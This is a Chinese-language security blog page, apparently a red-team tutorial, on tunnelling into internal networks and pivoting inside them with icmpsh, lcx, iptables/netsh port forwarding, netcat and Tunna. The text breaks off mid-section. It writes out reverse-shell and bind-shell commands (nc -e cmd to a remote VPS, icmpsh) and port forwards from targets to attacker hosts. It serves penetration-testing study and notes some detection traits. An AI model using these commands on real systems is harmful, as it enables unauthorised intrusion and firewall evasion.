

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="构建通道漫游内网判断内网连通性测试机器能否上网  ICMP  ping baidu.com  HTTP  curl baidu.com  DNS  nslookup baidu.com 114.114.114.114 &#x2F;&#x2F;指定dns解析域名 dig @8.8.8.8 baidu.com 仅DNS出网可以直接CS-DNS上线  TCP  nc  nc -lvvp 2333 nc -zv ip por">
<meta property="og:type" content="article">
<meta property="og:title" content="构建通道漫游内网">
<meta property="og:url" content="http://example.com/2022/02/19/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93%E6%BC%AB%E6%B8%B8%E5%86%85%E7%BD%91/index.html">
<meta property="og:site_name" content="🗄">
<meta property="og:description" content="构建通道漫游内网判断内网连通性测试机器能否上网  ICMP  ping baidu.com  HTTP  curl baidu.com  DNS  nslookup baidu.com 114.114.114.114 &#x2F;&#x2F;指定dns解析域名 dig @8.8.8.8 baidu.com 仅DNS出网可以直接CS-DNS上线  TCP  nc  nc -lvvp 2333 nc -zv ip por">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220228225530950.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301144255789.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301145815977.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301150845044.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301150608667.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/lcx.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/lcx2.gif">
<meta property="og:image" content="https://inotgo.com/imagesLocal/202111/08/20211108204253211w_0.png.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304133010463.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304140512685.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220304135427676.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/vpn.jpeg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-3efba166d9c57f233999dec4abb5bdfb_720w-165293759153410.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-4880f5f7d29e9669f3548ae6f00b4bdf_720w.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-0b8beb6ccd71b1f232343a4900aa2471_720w.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-d70c2447834f518a04d6c34ce7574231_720w-165293785745817.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-c1e97a220e4b5e23ca15faf2f687f206_720w.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/beepress-image-140684-1599633756.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132529954.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132806331.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327132914780.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220327133336510.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305154115425.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220519140717831.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326220356565.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326125535619.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326125347604.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220326110539622.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220326224539.png">
<meta property="article:published_time" content="2022-02-18T23:59:41.688Z">
<meta property="article:modified_time" content="2022-05-19T08:13:48.748Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="knowledge">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">
  
  <title>构建通道漫游内网 - 🗄</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->

  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>👩‍💻</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="构建通道漫游内网">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-02-19 07:59" pubdate>
        February 19, 2022 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      15k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">构建通道漫游内网</h1>
            
            <div class="markdown-body">
              <h1 id="构建通道漫游内网"><a href="#构建通道漫游内网" class="headerlink" title="构建通道漫游内网"></a>构建通道漫游内网</h1><h2 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h2><p>测试机器能否上网</p>
<ul>
<li>ICMP</li>
</ul>
<p><code>ping baidu.com</code></p>
<ul>
<li>HTTP</li>
</ul>
<p><code>curl baidu.com</code></p>
<ul>
<li>DNS</li>
</ul>
<p><code>nslookup baidu.com 114.114.114.114</code> //指定dns解析域名</p>
<p><code>dig @8.8.8.8 baidu.com</code></p>
<p>仅DNS出网可以直接CS-DNS上线</p>
<ul>
<li>TCP</li>
</ul>
<p><code>nc</code></p>
<blockquote>
<p>nc -lvvp 2333</p>
<p>nc -zv ip port //扫描时不发送任何数据，用于扫描</p>
<p>nc -nv ip port //不加n参数一样，会构建TCP/UDP连接读写数据</p>
</blockquote>
<ul>
<li>proxy</li>
</ul>
<p>流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段</p>
<p>判断：</p>
<ol>
<li>查看网络连接 netstat</li>
<li>查看内网是否有主机名类似于<code>proxy</code>的机器</li>
<li>本地一些软件的代理设置</li>
<li>pac文件</li>
<li>通过curl命令确认</li>
</ol>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl baidu.com <span class="hljs-regexp">//</span>不通<br>curl -x proxy_ip baidu.com <span class="hljs-regexp">//</span>通<br>proxychains<br></code></pre></td></tr></table></figure>

<ul>
<li>读取本机代理</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG QUERY <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="hljs-comment">#查看代理配置情况,连接它的代理试试</span><br></code></pre></td></tr></table></figure>

<ul>
<li>是否存在Nginx反向代理</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1、找到Nginx目录</span><br><span class="hljs-comment">#2、查看配置文件</span><br><span class="hljs-comment">#3、例如某次实战中发现正反向都代理不出去，查看配置文件发现了nginx反代，直接连接公网IP代理的3389端口</span><br></code></pre></td></tr></table></figure>

<h2 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h2><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><h4 id="ipv6"><a href="#ipv6" class="headerlink" title="ipv6"></a>ipv6</h4><p>socat、6tunnel、nt6tunnel</p>
<h4 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h4><p><img src="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ICMP协议用于检测网络连通状态，不依赖于端口开放，而防火墙通常会开放此协议。于是在上层隧道http，dns等均不可建立时，可以ping远程访问计算机，尝试建立icmp隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿透防火墙</p>
<h5 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a><a target="_blank" rel="noopener" href="https://github.com/inquisb/icmpsh">icmpsh</a></h5><p>跨平台，运行无需管理员权限，但会报毒</p>
<blockquote>
<p>icmpsh需要代替系统ping的应答程序，需要关闭系统的，保证shell的稳定</p>
<p>sysctl -w net.ipv4.icmp_echo_ignore_all=1</p>
</blockquote>
<p>可能存在的安装问题：以kali为例</p>
<p>运行：</p>
<blockquote>
<p>./run.sh</p>
</blockquote>
<p>提示安装impacket库，这里是python2运行的，因此需要pip2去安装</p>
<blockquote>
<p>安装pip2</p>
<p>wget <a target="_blank" rel="noopener" href="https://bootstrap.pypa.io/pip/2.7/get-pip.py">https://bootstrap.pypa.io/pip/2.7/get-pip.py</a></p>
</blockquote>
<p>安装pip2后安装库可能出现报错<code>egg_info</code>，则需要更新<code>setuptools</code></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220228225530950.png" srcset="/img/loading.gif" lazyload></p>
<p>这边运行./run.sh会报错，查看sh发现是</p>
<blockquote>
<p>python icmpsh_m.py “$IP” “VICTIM”</p>
</blockquote>
<p>于是kali</p>
<blockquote>
<p>python icmpsh_m.py 192.168.254.128 192.168.254.133</p>
</blockquote>
<p>目标</p>
<blockquote>
<p>icmpsh.exe -t 192.168.254.128</p>
<p>icmpsh.exe -t 192.168.254.128 -d 500 -b 30 -s 128 //500请求延迟(心跳)，断开shell前的最大数30，缓冲区数128</p>
</blockquote>
<p>具体参数：</p>
<blockquote>
<p>icmpsh.exe [options] -t target<br>options:<br>  -t host            host ip address to send ping requests to<br>  -r                 send a single test icmp request and then quit<br>  -d milliseconds    delay between requests in milliseconds (default is 200)<br>  -o milliseconds    timeout in milliseconds<br>  -h                 this screen<br>  -b num             maximal number of blanks (unanswered icmp requests) before quitting<br>  -s bytes           maximal data buffer size in bytes (default is 64 bytes)</p>
<p>In order to improve the speed, lower the delay (-d) between requests or increase the size (-s) of the data buffer</p>
</blockquote>
<p>如果环境中无python环境，则可以利用源码编译可执行文件</p>
<blockquote>
<p>gcc icmpsh-m.c -o icmpsh</p>
<p>./icmpsh 192.168.254.128 192.168.254.133</p>
</blockquote>
<p>icmp隧道分析<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113692119">https://zhuanlan.zhihu.com/p/113692119</a></p>
<p>普通的ping请求：</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301144255789.png" srcset="/img/loading.gif" lazyload></p>
<p>4个带有32字节数据的数据包</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">0000  <span class="hljs-number"> 48 </span>7d 2e f5 f2<span class="hljs-number"> 53 </span>34 7d f6 7b 2d<span class="hljs-number"> 11 </span>08<span class="hljs-number"> 00 </span>45<span class="hljs-number"> 00 </span>  H&#125;...S4&#125;.&#123;-...E.<br>0010  <span class="hljs-number"> 00 </span>3c 0a<span class="hljs-number"> 23 </span>00<span class="hljs-number"> 00 </span>80<span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>c0 a8<span class="hljs-number"> 01 </span>68<span class="hljs-number"> 31 </span>e9   .&lt;.<span class="hljs-comment">#.........h1.</span><br>0020  <span class="hljs-number"> 22 </span>43<span class="hljs-number"> 08 </span>00<span class="hljs-number"> 31 </span>19<span class="hljs-number"> 00 </span>01 1c<span class="hljs-number"> 42 </span>61<span class="hljs-number"> 62 </span>63<span class="hljs-number"> 64 </span>65<span class="hljs-number"> 66 </span>  &quot;C..1....Babcdef<br>0030  <span class="hljs-number"> 67 </span>68<span class="hljs-number"> 69 </span>6a 6b 6c 6d 6e 6f<span class="hljs-number"> 70 </span>71<span class="hljs-number"> 72 </span>73<span class="hljs-number"> 74 </span>75<span class="hljs-number"> 76 </span>  ghijklmnopqrstuv<br>0040  <span class="hljs-number"> 77 </span>61<span class="hljs-number"> 62 </span>63<span class="hljs-number"> 64 </span>65<span class="hljs-number"> 66 </span>67<span class="hljs-number"> 68 </span>69                     wabcdefghi<br></code></pre></td></tr></table></figure>

<p>icmp隧道搭建的shell执行了命令则会产出大量流量，主要包含icmp请求和回复</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301145815977.png" srcset="/img/loading.gif" lazyload></p>
<p>重点可以看一下</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301150845044.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220301150608667.png" srcset="/img/loading.gif" lazyload></p>
<p>获取到shell以及执行了whoami命令产生的数据包高达106字节，因此在溯源时可以从：</p>
<ul>
<li>单位时间的icmp数据包数量</li>
<li>数据包大小</li>
<li>数据包内容</li>
</ul>
<h5 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a><a target="_blank" rel="noopener" href="https://github.com/jamesbarlow/icmptunnel">icmptunnel</a></h5><h5 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel/releases">PingTunnel</a></h5><h5 id="powershell-icmp"><a href="#powershell-icmp" class="headerlink" title="powershell icmp"></a>powershell icmp</h5><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><h5 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h5><p>win  lcx.exe</p>
<p>linux lcx/portmap</p>
<ul>
<li>内网端口转发</li>
</ul>
<p>在目标机器上执行，将目标机器的指定端口(22)转发到公网 vps 指定端口上(80)</p>
<blockquote>
<p>./lcx -slave vps port 127.0.0.1 22</p>
</blockquote>
<p>在公网机器上监听80并转发到本机443端口上</p>
<blockquote>
<p>lcx.exe -listen 80 443<br>./portmap -m 2 -p1 80 -p2 443</p>
</blockquote>
<p>此时，攻击者用 ssh  公网IP+443 即可登陆目标服务器22</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/lcx.gif" srcset="/img/loading.gif" lazyload></p>
<p>lcx时间比较长了，找不到来源，可以参考<a target="_blank" rel="noopener" href="https://github.com/yw9381/lcx">https://github.com/yw9381/lcx</a></p>
<ul>
<li>本地端口映射，不直接访问22，但可以访问80(常用于绕过防火墙)</li>
</ul>
<blockquote>
<p>lcx -tran 80 127.0.0.1 22</p>
</blockquote>
<p>//备注：buu linux靶机修改其web服务端口为8080(外网不可直接访问)，然后做一个端口映射</p>
<blockquote>
<p> vim /etc/apache2/ports.conf</p>
<p>service apache2 restart</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/lcx2.gif" srcset="/img/loading.gif" lazyload></p>
<h5 id="iptables-linux"><a href="#iptables-linux" class="headerlink" title="iptables(linux)"></a>iptables(linux)</h5><p>1、编辑配置文件</p>
<blockquote>
<p>vi /etc/sysctl.conf<br>net.ipv4.ip_forward = 1 #开启IP转发</p>
</blockquote>
<p>2、关闭服务</p>
<blockquote>
<p>service iptables stop</p>
</blockquote>
<p>3、配置规则</p>
<blockquote>
<p>#需要访问的内网地址：10.1.1.11（Windows）<br>#内网边界web服务器：192.168.100.100（Linux）<br>iptables -t nat -A PREROUTING –dst 192.168.100.100 -p tcp –dport 3389 -j DNAT–to-destination 10.1.1.11:3389</p>
<p>iptables -t nat -A POSTROUTING –dst 10.1.1.11 -p tcp –dport 3389 -j SNAT –to-source 192.168.100.100</p>
</blockquote>
<p>4、保存并重启服务</p>
<blockquote>
<p> service iptables save &amp;&amp; service iptables start</p>
</blockquote>
<p>这时访问Web服务器的3389就能登录到内网机器的桌面了。</p>
<h5 id="netsh-win"><a href="#netsh-win" class="headerlink" title="netsh(win)"></a>netsh(win)</h5><p>仅支持TCP协议，适用于<strong>双网卡</strong>服务器</p>
<blockquote>
<p>netsh interface portproxy show all //查看现有规则</p>
<p>netsh interface portproxy set v4tov4 listenaddress=外网IP listenport=1234 connectaddress=内网IP connectport=3389 //添加转发规则，set改delete取消转发</p>
<p>netsh interface ipv6 install //xp下安装ipv6</p>
</blockquote>
<h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"> nc -h<br>[v1.11 NT www.vulnwatch.org/netcat/]<br>connect to somewhere:   nc [-options] hostname port[s] [ports] ...<br>listen for inbound:     nc -l -p port [options] [hostname] [port]<br>options:<br>        -d              detach from console, background mode<br>        -e prog         inbound program to exec [dangerous!!]<br>        -g gateway      source-routing hop point[s], up to 8<br>        -G num          source-routing pointer: 4, 8, 12, ...<br>        -h              this cruft<br>        -i secs         delay interval for lines sent, ports scanned<br>        -l              listen mode, for inbound connects<br>        -L              listen harder, re-listen on socket close<br>        -n              numeric-only IP addresses, no DNS<br>        -o file         hex dump of traffic<br>        -p port         local port number<br>        -r              randomize local and remote ports<br>        -s addr         local source address<br>        -t              answer TELNET negotiation<br>        -u              UDP mode<br>        -v              verbose [use twice to be more verbose]<br>        -w secs         timeout for connects and final net reads<br>        -z              zero-I/O mode [used for scanning]<br>port numbers can be individual or ranges: m-n [inclusive]<br></code></pre></td></tr></table></figure>

<p>来，英语不好的达瓦里氏，给你们翻译翻译</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -l -p port [options] [hostname] [port]<br><br>-d 后台模式<br>-e prog 程序重定向，一旦连接，就执行 [危险!!]<br>-g &lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个<br>-G &lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数<br>-h 帮助信息<br>-i secs 延时的间隔<br>-l 监听模式，用于入站连接<br>-L 连接关闭后,仍然继续监听<br>-n 指定数字的IP地址，不能用hostname<br>-o file 记录16进制的传输<br>-p port 本地端口号<br>-r 随机本地及远程端口<br>-s addr 本地源地址<br>-t 使用TELNET交互方式<br>-u UDP模式<br>-v 详细输出--用两个-v可得到更详细的内容<br>-w secs timeout的时间<br>-z 将输入输出关掉--用于扫描时<br><br>端口的表示方法可写为M-N的范围格式<br></code></pre></td></tr></table></figure>

<p><code>反向连接</code>：目标绑定shell并发起连接，vps监听</p>
<blockquote>
<p>vps：nc -lvvp 2333</p>
<p>target：nc -t -e cmd RemoteIP 2333 //cmd重定向到目标ip，即弹shell，也可以用powershell</p>
</blockquote>
<p><code>正向连接</code>：目标绑定shell并监听等待连接，vps发起连接</p>
<p><strong>情形往往是目标不出网</strong></p>
<blockquote>
<p>target：nc -lvvp 2333 -e cmd</p>
<p>nc -nvv targetIP 2333</p>
</blockquote>
<p>大白话就是：不管怎样，都是先监听后建立连接，区别在于谁在监听</p>
<h5 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h5><p>nc的powershell版本<a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<h5 id="Tunna"><a href="#Tunna" class="headerlink" title="Tunna"></a><a target="_blank" rel="noopener" href="https://github.com/SECFORCE/Tunna">Tunna</a></h5><p>有点像reGeorg的方式，但这是通过HTTP包装的TCP隧道工具，同样需要上传脚本</p>
<p>然后攻击机器：</p>
<blockquote>
<p>python proxy.py -u <a target="_blank" rel="noopener" href="http://xxx/conn.php">http://xxx/conn.php</a> -l 4444 -r 3389 -v</p>
</blockquote>
<p>现在即可通过本地4444访问到远端3389</p>
<h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><h5 id="udp2raw"><a href="#udp2raw" class="headerlink" title="udp2raw"></a><a target="_blank" rel="noopener" href="https://github.com/wangyu-/udp2raw">udp2raw</a></h5><h4 id="KCP"><a href="#KCP" class="headerlink" title="KCP"></a>KCP</h4><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112442341">kcp</a>TCP和UDP的折中方案</p>
<h5 id="Dog-Tunnel"><a href="#Dog-Tunnel" class="headerlink" title="Dog Tunnel"></a><a target="_blank" rel="noopener" href="https://github.com/vzex/dog-tunnel">Dog Tunnel</a></h5><p>又名狗洞，使用方法</p>
<p><a target="_blank" rel="noopener" href="https://hatboy.github.io/2018/08/28/%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%8F%8A%E7%A9%BF%E9%80%8F/2.png"><img src="https://inotgo.com/imagesLocal/202111/08/20211108204253211w_0.png.jpg" srcset="/img/loading.gif" lazyload></a></p>
<ul>
<li><p>dtunnel_s 为服务端 dtunnel 为客户端。远端是最终要连接的端口，通常是内网服务器，近端是本地需要连接的端口，通常是本地。</p>
</li>
<li><p>dtunnel_s  启动时会监听一个tcp端口，通过-addr设置，如果需要-ssl(默认是false)，那么要指定-cert加载ssl证书，之后客户端连接也要打开-ssl开关(默认是true的) -addrudp 是p2p打洞的辅助udp端口，能提高打洞成功率,对应dtunnel参数-buster指定同样的ip和端口</p>
</li>
<li><p>dtunnel_s 支持远程接口管理，如果需要，可通过-admin 指定ip:端口，比如-admin 127.0.0.1:1234</p>
</li>
<li><p>使用方法：</p>
<ol>
<li>首先在公网服务器上面启动服务，监听端口：</li>
</ol>
<blockquote>
<p>dtunnel_s -addr 0.0.0.0:8888 -ssl=false</p>
</blockquote>
</li>
<li><p>服务端参数说明：</p>
<ul>
<li>-addr：服务端地址，默认是：0.0.0.0:8000</li>
<li>-addrudp：UDP服务端地址，用于P2P辅助打洞，默认是：0.0.0.0:8018</li>
<li>-admin：管理接口，用于提供API方便管理，如：0.0.0.0:1234</li>
<li>-ssl：启用ssl支持，启用需要指定-cert和-cert参数，默认关闭，有bug，必须加上-ssl=false来关闭ssl</li>
<li>-https：启用管理接口的HTTPS支持，需要指定-cert和-cert参数，默认关闭</li>
<li>-cert：证书路径</li>
<li>-key：证书密钥路径</li>
<li>-dbhost：数据库服务器</li>
<li>-dbpass：数据库密码</li>
<li>-dbuser：数据库用户</li>
<li>-replace：如果客户端注册名冲突，踢掉之前的，默认关闭</li>
<li>-version：显示版本</li>
</ul>
<ol start="2">
<li>远端客户端连接服务端：</li>
</ol>
<blockquote>
